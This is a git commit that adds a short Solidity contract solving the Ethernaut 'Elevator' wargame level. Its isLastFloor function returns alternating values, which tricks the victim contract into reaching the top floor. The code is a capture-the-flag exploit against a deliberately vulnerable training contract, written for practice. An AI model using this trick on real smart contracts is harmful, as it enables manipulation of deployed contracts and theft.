b29298b2299bb95f243ab89fdb463eee6bf5467b
Aitor Zaldua <aitor.zaldua@draftdigital.org>
2022-11-16 18:59:22 +0100

    ethernau 11

---
+++ contracts/ElevatorAttack.sol
@@ -0,0 +1,28 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Elevator.sol";
+
+import "hardhat/console.sol";
+
+contract ElevatorAttack {
+
+    bool public toogleState = true;
+    bool public top;
+
+    Elevator public victimContract;
+
+    constructor (address _victimContractAddr) {
+        victimContract = Elevator(_victimContractAddr);
+    }
+
+    function isLastFloor (uint) public returns(bool) {
+        toogleState = !toogleState;
+        return toogleState;
+    }
+
+    function attack(uint _floor) public {
+        victimContract.goTo(_floor);
+    }
+
+}
